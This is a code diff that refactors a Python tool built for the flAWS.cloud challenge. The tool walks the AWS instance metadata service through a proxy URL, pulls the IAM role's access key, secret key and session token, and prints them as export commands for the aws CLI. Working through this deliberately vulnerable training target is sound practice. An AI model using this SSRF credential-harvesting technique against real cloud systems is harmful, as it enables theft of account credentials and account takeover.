@@ -4,6 +4,7 @@ Tool to scan the IMDS of AWS via a proxy URL on EC2.
 Used for the http://flAWS.cloud challenge.
 """
 
+import sys
 import json
 import argparse
 import requests
@@ -15,7 +16,7 @@ class Mem:
 
     def __init__(self):
         """init"""
-        self.mem = dict()
+        self.mem = {}
 
     def set(self, path: str, value=None):
         """
@@ -32,7 +33,7 @@ class Mem:
             elif type(self.mem[path]) == str:
                 # convert str to list of str
                 curr = self.mem[path]
-                self.mem[path] = list()
+                self.mem[path] = []
                 self.mem[path].append(curr)
                 self.mem[path].append(value)
             elif type(self.mem[path]) == list:
@@ -43,10 +44,11 @@ class Mem:
                     pass
             else:
                 # unexpected, so debug this
-                print(f'ERROR: Path={path}, Existing={self.mem[path]}, Type={type(self.mem[path])} new={value}')
+                print(f'ERROR: Path={path}, Existing={self.mem[path]}, ')
+                print(f'       Type={type(self.mem[path])}, new={value}')
                 print(self.mem)
                 print('*** Investigate this ***')
-                exit(1)
+                sys.exit(1)
         else:
             # new
             self.mem[path] = value
@@ -94,26 +96,20 @@ class IMDS:
 
         if req.status_code == 404:
             # end reached imds has no further details
-            return
-        if req.status_code != 200:
+            pass
+        elif req.status_code != 200:
             # investigate this
             print(f'[-] Check {url} has {req.status_code} {req.text}')
-            return
-
-
-        if req.text.startswith('{'):
+        elif req.text.startswith('{'):
             # value is a json structure; store as dict
             self.data.set(key, json.loads(req.text))
-            return
-        if req.text.startswith('<?'):
+        elif req.text.startswith('<?'):
             # value is a XML structure
             self.data.set(key, req.text)
-            return
-        if leaf in ['signature', 'rsa2048', 'pkcs7']:
+        elif leaf in ['signature', 'rsa2048', 'pkcs7']:
             # known leafs that have base64 values
             self.data.set(key, req.text)
-            return
-        if req.headers.get('Content-Type') == 'text/plain':
+        elif req.headers.get('Content-Type') == 'text/plain':
             # list to spider further
             subs = req.text.splitlines()
             for sub in subs:
@@ -125,7 +121,6 @@ class IMDS:
                     self.data.set(key, sub)
         else:
             self.data.set(key, req.text)
-            return
         return
 
 
@@ -156,11 +151,9 @@ elif args.creds:
     # long term keys, identified by AKIA*
     #
     imds.spider('latest/dynamic/instance-identity', 'document', spider=False)
-    # imds.spider('latest/meta-data/identity-credentials/ec2/security-credentials', 'ec2-instance', spider=False)
     imds.spider('latest/meta-data/iam','security-credentials', spider=True)
 
     ec2 = imds.data.mem["latest/dynamic/instance-identity/document"]
-    # id1 = imds.data.mem["latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]
     role= imds.data.mem["latest/meta-data/iam/security-credentials"]
     id2 = imds.data.mem["latest/meta-data/iam/security-credentials/flaws"]
 
@@ -170,19 +163,14 @@ elif args.creds:
     print(f'export ACCOUNT_ID={ec2["accountId"]}')
     print(f'export INSTANCE_ID={ec2["instanceId"]}')
     print(f'export AWS_REGION={ec2["region"]}')
-    print(f'export ROLE={role}') 
-    #
-    # print('# profile ec2-instance')
-    # print(f'export AWS_ACCESS_KEY_ID={id1["AccessKeyId"]}')
-    # print(f'export AWS_SECRET_ACCESS_KEY={id1["SecretAccessKey"]}')
-    # print(f'export AWS_SESSION_TOKEN={id1["Token"]}')
+    print(f'export ROLE={role}')
     #
     print(f'# or use: aws configure with --profile {role}')
     print(f'export AWS_ACCESS_KEY_ID={id2["AccessKeyId"]}')
     print(f'export AWS_SECRET_ACCESS_KEY={id2["SecretAccessKey"]}')
     print(f'export AWS_SESSION_TOKEN={id2["Token"]}')
     print('# apply these, then call: aws sts get-caller-identity')
-    exit(1)
+    sys.exit(1)
 
 else:
     # spider all
@@ -192,8 +180,7 @@ if args.output is None:
     print(imds)
 else:
     print(f'[+] Writing JSON to file {args.output}')
-    with open(args.output, "w") as file:
+    with open(args.output, "w", encoding="utf-8") as file:
         file.write(str(imds))
 
 print('Finished.')
-exit(1)
